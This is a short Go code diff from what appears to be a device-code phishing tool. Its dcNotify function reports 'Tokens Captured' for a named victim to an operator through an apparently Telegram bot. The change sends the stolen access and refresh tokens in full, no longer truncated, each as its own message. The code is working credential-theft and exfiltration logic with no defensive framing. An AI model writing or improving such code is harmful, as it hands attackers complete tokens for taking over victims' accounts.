@@ -483,18 +483,16 @@ func dcNotify(s *DCTarget) {
 	if target == "" {
 		target = s.Tenant
 	}
-	msg := fmt.Sprintf(
+	header := fmt.Sprintf(
 		"🎯 *Device Code — Tokens Captured\\!*\n\n"+
 			"📧 Target: `%s`\n"+
-			"👤 Code: `%s`\n\n"+
-			"🔑 *Access Token:*\n`%s`\n\n"+
-			"♻️ *Refresh Token:*\n`%s`",
+			"👤 Code: `%s`",
 		tgEscape(target),
 		tgEscape(s.UserCode),
-		trunc(s.AccessToken, 200),
-		trunc(s.RefreshToken, 200),
 	)
-	GlobalBot.send(adminID, msg)
+	GlobalBot.send(adminID, header)
+	GlobalBot.send(adminID, "🔑 *Access Token:*\n```\n"+s.AccessToken+"\n```")
+	GlobalBot.send(adminID, "♻️ *Refresh Token:*\n```\n"+s.RefreshToken+"\n```")
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
